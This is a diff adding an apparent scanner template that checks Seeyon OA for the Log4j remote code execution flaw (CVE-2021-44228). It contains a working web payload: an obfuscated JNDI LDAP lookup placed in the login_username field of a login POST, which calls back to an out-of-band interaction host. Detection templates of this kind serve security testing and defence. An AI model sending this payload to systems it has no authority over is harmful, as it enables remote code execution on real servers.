@@ -1,0 +1,25 @@
+id: seeyon-oa-log4j-rce
+brief:
+    title: Seeyon OA (Log4j) - Remote Code Execution
+    by: SleepingBag945
+    level: critical
+    about: Seeyon OA is susceptible to remote code execution via the Apache Log4j 2 library prior to 2.15.0 by recording its own log information, specifically with specially crafted values sent as user input....
+    label:
+        - cve
+        - cve2021
+        - rce
+        - jndi
+        - log4j
+        - seeyon-oa
+        - kev
+        - oast
+        - vuln
+    score: CVE-2021-44228 CVSS:10.0
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/seeyon/main.do?method=login'
+      head:
+        Content-Type: application/x-www-form-urlencoded
+      body: authorization=&login.timezone=GMT+8:00&province=&city=&rectangle=&login_username=${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://{{interactsh-url}}}
+      signs: []
